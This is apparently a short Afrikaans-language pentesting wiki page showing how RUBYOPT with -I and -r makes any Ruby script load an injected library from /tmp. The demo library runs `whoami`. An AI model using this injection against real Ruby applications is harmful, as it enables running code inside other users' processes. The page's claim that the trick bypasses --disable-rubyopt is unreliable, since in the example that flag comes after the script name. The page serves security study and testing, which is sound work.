# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Deur hierdie env variable te gebruik, is dit moontlik om **nuwe params** by **ruby** te voeg wanneer dit uitgevoer word. Hoewel die param **`-e`** nie gebruik kan word om ruby-kode te spesifiseer wat uitgevoer moet word nie, is dit moontlik om die params **`-I`** en **`-r`** te gebruik om ’n nuwe folder by die libraries se laaipad te voeg en dan **’n library te spesifiseer wat gelaai moet word**.

Skep die library **`inject.rb`** in **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Skep enige plek 'n Ruby script soos:
```ruby:hello.rb
puts 'Hello, World!'
```
Laat dan ’n arbitrêre Ruby script dit laai met:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Interessante feit, dit werk selfs met param **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
